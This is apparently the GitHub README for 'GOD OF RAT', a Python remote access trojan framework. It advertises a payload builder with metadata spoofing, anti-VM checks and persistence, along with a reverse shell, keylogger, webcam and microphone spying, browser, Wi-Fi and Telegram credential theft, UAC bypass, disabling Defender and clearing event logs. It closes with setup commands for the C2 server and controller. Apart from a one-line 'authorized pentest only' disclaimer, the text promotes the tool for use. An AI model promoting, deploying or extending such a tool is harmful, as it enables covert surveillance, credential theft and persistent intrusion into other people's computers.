<p align="center">
  <img src="icons/rat_ico.png" width="170">
</p>

<p align="center">
  <img src="icons/word.png" width="650">
</p>

<p align="center">
  <b>THE BEST PYTHON RAT FRAMEWORK</b>
</p>
<p align="center">
  <b>⚠️For authorized pentest only⚠️</b>
</p>
<p align="center">
  <a href="https://god-of-rat.gitbook.io/god-of-rat">
    <img src="https://img.shields.io/badge/FULL_DOCUMENTATION-8B0000?style=for-the-badge&logo=gitbook&logoColor=white">
  </a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.10%2B-1a1a1a?logo=python&logoColor=white&color=5a1a1a">
  <img src="https://img.shields.io/badge/License-MIT-5a1a1a">
  <img src="https://img.shields.io/github/stars/Katastrofa0/GOD-OF-RAT?style=flat&color=9c2e2e">
</p>

---

<p align="center">
  <b>This is the most convenient and user-friendly Python RAT framework, async-powered and a pure joy to use.</b>
</p>

<p align="center">
  <img src="icons/preview.png" width="999">
</p>


### KEY FEATURES

| Category | Capabilities |
| :--- | :--- |
| **Async C2 Core** | Non-blocking WebSocket server built on Python Asyncio — handles hundreds of agents simultaneously. |
| **Interactive Agent Builder** | GUI-powered payload generator. Select modules to include/exclude, inject AES keys, set custom icons, spoof file metadata, enable Anti-VM, add size to agent, and choose persistence method — all before compilation. |
| **Telegram Bot Multiplexer** | Run multiple Telegram bots simultaneously. Isolated session routing per user — perfect for collaborative red teams. |
| **AES-256 Encryption** | Full traffic encryption between server, controller, and agents. Optional plain-text mode for debugging. |
| **Remote Shell** | Interactive reverse shell with command history. Execute any system command in real time. |
| **File System Manager** | Remote file browser with upload (drag & drop + chunked), download, delete, and execute capabilities. |
| **Live Surveillance** | Live screen stream, webcam streaming, microphone capture, screenshot, keylogger (timed or continuous). |
| **Credentials Harvesting** | Wi-Fi passwords, browser secrets (Chrome/Edge/Firefox/Brave), OpenVPN, Telegram tdata session extraction. |
| **Evasion & Persistence** | UAC Bypass (Fodhelper), disable Defender / Firewall, Anti-VM detection, Event Log cleaner. Juicy persistence techniques: Registry, Startup Folder, Scheduled Task, WMI, Windows Service. |
| **Windows Management** | Remote Registry Editor, Service manager, Scheduled Tasks, WMI subscriptions, Process manager. |
| **Fun Modules** | Screen zoom, mouse inverter, drunk mouse, window shake, mouse trail ghosts, persistent alert boxes, disabling Task Manager, and more. |
<p align="center">
<sub>Feel free to submit PRs, suggest new modules, or improve existing ones.</sub>
</p>
<p align="center">
<sub>Let's make this framework a community effort.</sub>
</p>

---

### ◈ QUICK START

```bash
git clone https://github.com/Katastrofa0/GOD-OF-RAT.git
cd GOD-OF-RAT
pip install -r requirements.txt
```
If you encountered some PyAudio trouble, install it like this:
```bash
pip install pipwin
pipwin install pyaudio
```
```bash
python server.py [--aes-key '$aeskey']  # Start server
python controller.py  # Launch GUI (another terminal)

# Make sure encryption.py is in the same directory as server.py
```
<p align="center">
  <b>Comprehensive documentation with setup instructions and detailed module descriptions is available here:</b>
</p>
<p align="center">
  <b>https://god-of-rat.gitbook.io/god-of-rat</b>
</p>

---

<p align="center">
  <a href="https://star-history.com/#Katastrofa0/GOD-OF-RAT&Date">
    <img src="https://api.star-history.com/svg?repos=Katastrofa0/GOD-OF-RAT&type=Date&theme=dark" width="880">
  </a>
</p>
